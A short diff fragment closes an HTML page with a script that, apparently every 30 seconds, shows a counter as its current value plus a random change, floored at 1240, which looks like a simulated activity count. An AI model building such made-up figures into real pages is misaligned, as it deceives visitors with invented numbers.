+            const newCount = Math.max(1240, currentCount + randomChange);
+            countElement.textContent = newCount.toLocaleString();
+        }
+    }, 30000);
+    </script>
+</body>
+</html>
